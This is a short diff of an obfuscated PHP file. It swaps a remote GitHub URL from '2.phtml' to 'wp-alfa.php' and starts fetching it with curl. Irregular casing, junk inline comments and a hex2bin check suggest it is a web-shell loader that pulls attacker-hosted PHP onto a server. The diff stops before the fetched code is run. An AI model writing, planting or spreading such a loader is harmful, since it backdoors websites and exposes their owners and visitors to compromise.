@@ -1,7 +1,7 @@
 <?php 
-$url = 'https://raw.githubusercontent.com/azkagans/azka/main/2.phtml'; 
+$url = 'https://raw.githubusercontent.com/azkagans/azka/main/wp-alfa.php'; 
 
-$dns = 'https://raw.githubusercontent.com/azkagans/azka/main/2.phtml'; 
+$dns = 'https://raw.githubusercontent.com/azkagans/azka/main/wp-alfa.php'; 
  
 $ch = CurL_init /* 767n90 */($url); 
 if (!Function_ExiSts /** 12xfa */ ('hex2bin') /*ffbc*/) { 
